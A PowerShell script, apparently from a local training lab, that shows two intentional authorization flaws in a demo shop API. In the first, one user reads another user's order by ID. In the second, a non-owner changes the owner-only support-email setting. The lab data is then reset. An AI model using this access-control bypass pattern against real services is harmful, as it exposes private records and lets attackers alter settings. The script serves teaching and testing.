# LOCAL TRAINING LAB ONLY. Demonstrates two intentional authorization flaws.
# Start the app separately with: npm.cmd start
$ErrorActionPreference = 'Stop'
$Base = 'http://127.0.0.1:4000'
function Get-Token([string]$email,[string]$password) {
  $body = @{ email=$email; password=$password } | ConvertTo-Json
  return (Invoke-RestMethod -Uri "$Base/api/auth/token" -Method Post -ContentType 'application/json' -Body $body).token
}
$OwnerToken = Get-Token 'owner@sprout.local' 'OwnerDemo!26'
$AliceToken = Get-Token 'alice@sprout.local' 'AppleA!26'
$BobToken   = Get-Token 'bob@sprout.local' 'BerryB!26'
$OwnerHeaders = @{ Authorization = "Bearer $OwnerToken" }
$AliceHeaders = @{ Authorization = "Bearer $AliceToken" }
$BobHeaders   = @{ Authorization = "Bearer $BobToken" }

Write-Host "`n1. Alice sees only her own orders on the orders list" -ForegroundColor Cyan
(Invoke-RestMethod -Uri "$Base/api/orders" -Headers $AliceHeaders).orders | Select-Object orderId,ownerUserId

Write-Host "`n2. Alice directly requests Bob's order details" -ForegroundColor Cyan
$OtherOrder = (Invoke-RestMethod -Uri "$Base/api/orders/order-b-1002" -Headers $AliceHeaders).order
$OtherOrder | Select-Object orderId,ownerUserId,privateMarker
Write-Host 'This is an unintended private-record read.' -ForegroundColor Yellow

Write-Host "`n3. Owner's current contact email" -ForegroundColor Cyan
(Invoke-RestMethod -Uri "$Base/api/shop/settings" -Headers $OwnerHeaders).settings.supportEmail

Write-Host "`n4. Bob submits an owner-only settings update" -ForegroundColor Cyan
$change = @{ supportEmail = 'unauthorised-lab-edit@sprout.local' } | ConvertTo-Json
Invoke-RestMethod -Uri "$Base/api/shop/settings" -Method Patch -Headers $BobHeaders -ContentType 'application/json' -Body $change | Out-Null
Write-Host "Owner now sees:" -ForegroundColor Yellow
(Invoke-RestMethod -Uri "$Base/api/shop/settings" -Headers $OwnerHeaders).settings.supportEmail

Write-Host "`n5. Reset only the synthetic lab data" -ForegroundColor Cyan
Invoke-RestMethod -Uri "$Base/api/lab/reset" -Method Post -Headers $OwnerHeaders -ContentType 'application/json' -Body '{}' | Out-Null
Write-Host 'Reset complete.' -ForegroundColor Green
